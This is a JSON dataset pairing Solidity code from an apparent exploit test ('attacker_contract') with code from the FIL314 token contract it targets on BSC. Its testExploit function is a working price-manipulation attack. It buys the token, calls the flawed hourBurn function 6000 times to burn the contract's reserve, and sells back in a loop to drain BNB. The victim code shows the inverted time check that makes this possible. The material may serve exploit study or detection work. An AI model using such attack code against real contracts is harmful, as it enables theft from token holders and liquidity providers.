[
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FIL314",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Implement exploit code here\n        emit log_named_decimal_uint(\" Attacker BNB Balance Before exploit\", address(this).balance, 18);\n        // buy FIL314 token\n        address(FIL314).call{value: 0.05 ether}(\"\");\n        // deflate the token\n        for (uint256 i = 0; i < 6000; i++) {\n            FIL314.hourBurn();\n        }\n        for (uint256 i = 0; i < 10; i++) {\n            uint256 amount = FIL314.getAmountOut(address(FIL314).balance, true);\n            // sell the token\n            FIL314.transfer(address(FIL314), amount);\n        }\n\n        // Log balances after exploit\n        emit log_named_decimal_uint(\" Attacker BNB Balance After exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFIL314",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFIL314",
    "source_type": "victim_contract",
    "function_name": "getAmountOut",
    "original_code": "    function getAmountOut(\n        uint256 value,\n        bool _buy\n    ) public view returns (uint256) {\n        (uint256 reserveETH, uint256 reserveToken) = getReserves();\n\n        if (_buy) {\n            return (value * reserveToken) / (reserveETH + value);\n        } else {\n            return (value * reserveETH) / (reserveToken + value);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFIL314",
    "source_type": "victim_contract",
    "function_name": "hourBurn",
    "original_code": "    function hourBurn() public {\n        if (hourBurnTime + 3600 < block.timestamp) {\n            return;\n        }\n        hourBurnTime = hourBurnTime + 3600;\n        uint256 burnHour = _balances[address(this)] * 2500 / 1000000;\n        _balances[address(this)] = _balances[address(this)] - burnHour;\n        emit Transfer(address(this), address(0), burnHour);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFIL314",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 value) public virtual returns (bool) {\n        if (msg.sender == address(dividendTracker) || to == address(dividendTracker)) {\n            saveBackLP(value);\n        } else if (to == address(this)) {\n            sell(value);\n            dividendTracker.addHolder(msg.sender);\n            if(isExcludedFromFee[msg.sender]==false){\n                dividendTracker.processReward(dividendGas);\n            }\n        } else {\n            dividendTracker.addHolder(to);\n            dividendTracker.addHolder(msg.sender);\n            if (tradingEnable) {\n                if(isExcludedFromFee[msg.sender]==false){\n                    sellDividend(value, to);\n                }else{\n                    _transferUser(msg.sender, to, value);\n                }\n            } else {\n                _transferUser(msg.sender, to, value);\n            }\n            if(isExcludedFromFee[msg.sender]==false){\n                dividendTracker.processReward(dividendGas);\n            }\n        }\n        return true;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal virtual {\n        require(\n            _balances[from] >= value,\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        unchecked {\n            _balances[from] = _balances[from] - value;\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    function _transferUser(\n        address from,\n        address to,\n        uint256 value\n    ) internal virtual {\n\n        require(\n            _balances[from] >= value,\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        unchecked {\n            _balances[from] = _balances[from] - value;\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n",
    "description": ""
  }
]